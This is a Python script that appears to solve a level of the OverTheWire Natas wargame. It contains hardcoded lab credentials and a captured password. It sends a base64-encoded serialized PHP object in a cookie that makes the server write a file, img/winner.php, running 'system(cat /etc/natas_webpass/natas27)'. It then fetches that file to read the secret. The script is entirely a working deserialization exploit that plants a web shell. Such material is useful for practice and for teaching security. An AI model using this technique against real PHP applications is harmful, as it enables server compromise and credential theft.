import requests
from string import *

username='natas26'
password='oGgWAJ7zcGT28vYazGo4rkhOPDhBu34T'
url='http://%s.natas.labs.overthewire.org/'%username
local='http://localhost:4000/www/app.php?'

session=requests.Session()
response=session.get(url+'?x1=10&y1=20&x2=6&y2=18',cookies={"drawing" : 'Tzo2OiJMb2dnZXIiOjM6e3M6MTU6IgBMb2dnZXIAbG9nRmlsZSI7czoxNDoiaW1nL3dpbm5lci5waHAiO3M6MTU6IgBMb2dnZXIAaW5pdE1zZyI7czo1MDoiPD9waHAgc3lzdGVtKCdjYXQgL2V0Yy9uYXRhc193ZWJwYXNzL25hdGFzMjcnKTsgPz4iO3M6MTU6IgBMb2dnZXIAZXhpdE1zZyI7czo1MDoiPD9waHAgc3lzdGVtKCdjYXQgL2V0Yy9uYXRhc193ZWJwYXNzL25hdGFzMjcnKTsgPz4iO30='},auth=(username,password))

print response.text
print "="*80

response=session.get(url+'img/winner.php',auth=(username,password))

print response.text
#55TBjpPZUUJgVP5b3BnbG6ON9uDPVzCJ
